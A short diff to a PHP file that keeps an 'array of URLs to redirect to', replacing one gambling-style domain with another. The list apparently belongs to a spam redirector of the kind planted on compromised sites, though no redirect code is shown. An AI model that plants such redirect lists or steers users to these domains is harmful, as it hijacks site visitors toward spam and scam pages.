@@ -1,7 +1,7 @@
 <?php
 // Array of URLs to redirect to
 $urls = [
-    'https://sateslotsapi.store',
+    'https://sateslot2024.pro',
     'https://nasgorbetseafood.online',
     'https://megaforwinkeren.pro',
     'https://nagaforwingacor.shop',
